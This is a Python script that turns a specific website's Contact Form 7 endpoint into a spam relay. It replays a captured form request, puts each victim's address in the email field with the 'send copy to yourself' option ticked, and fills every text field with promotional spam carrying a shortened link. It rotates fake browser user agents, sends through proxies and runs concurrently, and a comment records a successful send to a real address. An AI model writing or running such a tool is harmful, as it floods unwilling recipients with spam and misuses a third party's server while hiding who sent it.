import requests
from faker import Faker
from requests_toolbelt import MultipartEncoder

from module.spam_abstraction import Spam

request = {
    "url": "https://sgg.ae/wp-json/contact-form-7/v1/contact-forms/295/feedback",
    "headers": [
        {
            "name": "accept",
            "value": "application/json, text/javascript, */*; q=0.01"
        },
        {
            "name": "accept-encoding",
            "value": "gzip, deflate, br"
        },
        {
            "name": "accept-language",
            "value": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7"
        },
        {
            "name": "content-length",
            "value": "1114"
        },
        {
            "name": "content-type",
            "value": "multipart/form-data; boundary=----WebKitFormBoundaryTZOt4ODobj2dADoG"
        },
        {
            "name": "cookie",
            "value": "pll_language=en"
        },
        {
            "name": "origin",
            "value": "https://sgg.ae"
        },
        {
            "name": "referer",
            "value": "https://sgg.ae/contact-us/"
        },
        {
            "name": "sec-ch-ua",
            "value": "\"Chromium\";v=\"106\", \"Google Chrome\";v=\"106\", \"Not;A=Brand\";v=\"99\""
        },
        {
            "name": "sec-ch-ua-mobile",
            "value": "?0"
        },
        {
            "name": "sec-ch-ua-platform",
            "value": "\"Windows\""
        },
        {
            "name": "sec-fetch-dest",
            "value": "empty"
        },
        {
            "name": "sec-fetch-mode",
            "value": "cors"
        },
        {
            "name": "sec-fetch-site",
            "value": "same-origin"
        },
        {
            "name": "user-agent",
            "value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
        },
        {
            "name": "x-requested-with",
            "value": "XMLHttpRequest"
        }
    ],
    "cookies": [
        {
            "name": "pll_language",
            "value": "en",
            "path": "/",
            "domain": "sgg.ae",
            "expires": "2023-10-04T12:56:29.911Z",
            "httpOnly": False,
            "secure": True
        }
    ],
    "postData": {
        "params": [
            {
                "name": "_wpcf7",
                "value": "295"
            },
            {
                "name": "_wpcf7_version",
                "value": "5.1.4"
            },
            {
                "name": "_wpcf7_locale",
                "value": "en_US"
            },
            {
                "name": "_wpcf7_unit_tag",
                "value": "wpcf7-f295-o1"
            },
            {
                "name": "_wpcf7_container_post",
                "value": "0"
            },
            {
                "name": "your-name",
                "value": "TWAT"
            },
            {
                "name": "your-email",
                "value": "softumwork@gmail.com"
            },
            {
                "name": "your-subject",
                "value": "TWAT"
            },
            {
                "name": "your-message",
                "value": "TWAT"
            },
            {
                "name": "send_c[]",
                "value": "Send copy to yourself"
            }
        ]
    }
}
headers = {item['name']: item['value'] for item in request['headers']}
cookies = {item['name']: item['value'] for item in request['cookies']}
CONTENT = {item['name']: item['value'] for item in request['postData']['params']}
headers['user-agent'] = Faker().chrome()


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response:
        text = self.get_text()
        CONTENT['your-name'] = text
        CONTENT['your-message'] = text
        CONTENT['your-subject'] = text
        CONTENT['your-email'] = target
        content = MultipartEncoder(fields=CONTENT)
        headers['content-type'] = content.content_type
        resp = requests.post(request['url'], headers=headers, data=content, cookies=cookies, proxies=self.get_proxies())
        return resp


if __name__ == '__main__':
    success_message = 'successfully'
    project_name = 'sgg'
    promo_link = 'bit.ly/3G0yMFf'
    spam = ConcreteSpam(promo_link, project_name, success_message)
    res = spam.send_post('worksoftum@gmail.com')  # sgg bit.ly/3ruPXpU 2022-10-20 10:57:37,143: True softumwork@gmail.com
    if res:
        spam.run_concurrently(5)
